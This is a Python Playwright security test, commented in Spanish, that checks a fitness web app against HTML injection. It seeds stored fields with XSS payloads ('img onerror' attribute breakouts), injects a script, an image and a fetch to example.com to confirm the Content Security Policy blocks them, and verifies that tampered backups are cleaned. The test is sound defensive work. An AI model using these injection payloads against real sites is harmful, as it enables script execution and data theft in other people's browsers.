"""Prueba de inyección de HTML: rellena nombres, notas, campos numéricos y la foto de perfil con código HTML malicioso y
recorre las 39 pantallas de tests/shots.py. Falla si alguna pantalla llega a ejecutar ese código (un dato mal escapado).
Ese recorrido va sin la CSP (bypass_csp), para probar el escapado por sí solo; luego se prueba la CSP, la segunda barrera:
con ella, ni un atributo on…= ni un <script> añadido se ejecutan, y no salen imágenes ni conexiones a otros sitios.
Además comprueba que una copia de seguridad o unos datos guardados con una foto de perfil manipulada no la cargan.

  python3 tests/security.py dist/stratafit.html
"""
import os, sys, datetime
from playwright.sync_api import sync_playwright

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from shots import SCR  # noqa: E402
from browser import launch, app_url, context_opts  # noqa: E402


def rd(n):
    t = open(os.path.join(HERE, n), encoding='utf-8').read()
    return chr(10).join(l for l in t.split(chr(10)) if not l.startswith('//'))


PAY = '"\'><img src=x onerror="window.__x=(window.__x||[]).concat(window.__scr)"><b>'
# foto de perfil que intenta salirse del atributo src (auditoría S1)
IMG = 'x" onerror="window.__x=(window.__x||[]).concat(\'foto \'+window.__scr)'
MUT = """(P=>{const deep=o=>{if(o&&typeof o=='object')for(const k in o){const v=o[k];if(typeof v=='string'&&['n','nt','x','name','nm'].includes(k))o[k]=v+P;else deep(v)}};
 deep(S.cx);deep(S.cr);deep(S.cp);deep(S.logs);deep(S.plan);
 Object.keys(S.notes||{}).forEach(k=>{S.notes[k]+=P});
 S.pf=S.pf||{};S.pf.name='Yo'+P;S.pf.email=P;S.pf.tel=P;S.pf.img=%s;
 S.bio=Object.assign(S.bio||{},{age:P,h:P,w:P});S.nu=Object.assign(S.nu||{},{k:P});
 const d=Object.keys(S.meals||{})[0];if(d)Object.values(S.meals[d]).forEach(l=>(l||[]).forEach(it=>{it.g=P}));
 S.wdc=Object.assign(S.wdc||{},{md:'amrap',min:P});
 S.cf=(S.cf||[]).concat([{n:'Galleta'+P,b:[400,60,6,15,2,.5]}]);
 saveState()})(%s)""" % (repr(IMG), repr(PAY))


# lo que haría un dato que llegara sin escapar: un atributo on…=, un <script> nuevo, una imagen y una conexión a otro sitio
ATTACK = """document.body.insertAdjacentHTML('beforeend','<img src="data:," onerror="window.__y=1"><img src="https://example.com/p.png?d=1">');
 const s=document.createElement('script');s.textContent='window.__y=2';document.body.appendChild(s);
 fetch('https://example.com/?d=1').catch(()=>{})"""


def csp_check(b, path):
    """Con la CSP puesta (sin bypass): [(comprobación, correcta, detalle)]."""
    c = b.new_context(viewport={'width': 390, 'height': 844}, **context_opts(path))
    c.add_init_script(rd('init.js'))
    pg = c.new_page()
    pg.goto(app_url(path))
    pg.wait_for_timeout(800)
    ev = pg.evaluate
    pol = ev("(document.querySelector('meta[http-equiv=Content-Security-Policy]')||{}).content||''")
    clean = ev('window.__csp||[]')
    ev(ATTACK)
    pg.wait_for_timeout(700)
    v = ev('window.__csp||[]')
    out = [('la CSP está puesta y la app arranca con ella sin bloqueos', bool(pol) and ev('!!window.__ffok') and not clean, [pol[:80], clean]),
           ('con la CSP no se ejecuta código inyectado (on…= ni <script>)', ev('window.__y') is None and len([x for x in v if x.startswith('script-src')]) >= 2, v),
           ('con la CSP no salen imágenes ni conexiones a otros sitios', any(x.startswith('img-src') for x in v) and any(x.startswith('connect-src') for x in v), v)]
    c.close()
    return out


def main(path):
    path = os.path.abspath(path)
    with sync_playwright() as p:
        b = launch(p)
        c = b.new_context(viewport={'width': 390, 'height': 844}, bypass_csp=True, **context_opts(path))
        c.add_init_script(rd('init.js'))
        pg = c.new_page()
        pg.on('dialog', lambda d: d.accept())
        pg.clock.install(time=datetime.datetime(2026, 10, 29, 12, 0, 0))
        pg.goto(app_url(path))
        pg.clock.run_for(800)
        pg.evaluate(rd('seed.js'))
        pg.evaluate(rd('extra.js'))
        pg.evaluate(MUT)
        pg.reload()
        pg.wait_for_load_state('load')
        pg.clock.run_for(800)
        bad = []
        # unos datos guardados con la foto manipulada: al arrancar se descarta
        stored = pg.evaluate("S.pf.img===undefined")
        for k, js in SCR.items():
            try:
                pg.evaluate("window.__scr=%r;sheet();if(W){W=null}" % k)
                pg.evaluate(js)
                pg.clock.run_for(300)
                pg.wait_for_timeout(100)
            except Exception as e:
                bad.append(k + ': ' + str(e)[:80])
        # y aunque llegara a la memoria, Perfil no la inserta: solo admite imágenes de verdad
        pg.evaluate("window.__scr='perfil con foto manipulada';sheet();W=null;S.pf.img=%s;S.tab=3;R()" % repr(IMG))
        pg.clock.run_for(300)
        pg.wait_for_timeout(100)
        # una copia de seguridad con la foto manipulada se lee sin ella (y la cuenta como arreglada)
        restored = pg.evaluate("(img=>{const r=parseBackup(JSON.stringify(Object.assign({},S,{pf:{name:'Ana',img}})));return [r.s.pf.img===undefined,r.s.pf.name,r.fix]})(%s)" % repr(IMG))
        good = pg.evaluate("(()=>{const ok='data:image/jpeg;base64,/9j/4AAQSkZJRg==';return parseBackup(JSON.stringify(Object.assign({},S,{pf:{img:ok}}))).s.pf.img===ok})()")
        hit = sorted(set(str(x) for x in pg.evaluate('window.__x||[]')))
        # control: en este recorrido (sin CSP) un HTML inyectado de verdad sí se ejecuta, así que la prueba lo vería
        pg.evaluate("document.body.insertAdjacentHTML('beforeend','<img src=\"data:,\" onerror=\"window.__z=1\">')")
        pg.clock.run_for(200)
        pg.wait_for_timeout(300)
        control = pg.evaluate('window.__z') == 1
        c.close()
        csp = csp_check(b, path)
        b.close()
    print('  pantallas recorridas:', len(SCR))
    print('  ' + ('ok    ' if not hit else 'FALLA ') + 'ninguna ejecuta HTML inyectado', hit or '')
    print('  ' + ('ok    ' if control else 'FALLA ') + 'control: sin la CSP, un HTML inyectado sí se ejecutaría (la prueba lo detecta)')
    print('  ' + ('ok    ' if stored else 'FALLA ') + 'al arrancar se descarta una foto de perfil que no es una imagen')
    print('  ' + ('ok    ' if restored[0] and restored[1] == 'Ana' and restored[2] >= 1 else 'FALLA ') + 'una copia con la foto manipulada se restaura sin ella', '' if restored[0] else restored)
    print('  ' + ('ok    ' if good else 'FALLA ') + 'una foto de perfil de verdad sí se conserva')
    for name, cond, info in csp:
        print('  ' + ('ok    ' if cond else 'FALLA ') + name, '' if cond else info)
    if bad:
        print('  FALLA errores al abrir pantallas:', bad[:5])
    ok = not hit and not bad and stored and restored[0] and restored[1] == 'Ana' and restored[2] >= 1 and good and control and all(x[1] for x in csp)
    print('\n' + ('TODO CORRECTO' if ok else 'FALLAN'))
    sys.exit(0 if ok else 1)


main(sys.argv[1] if len(sys.argv) > 1 else 'dist/stratafit.html')
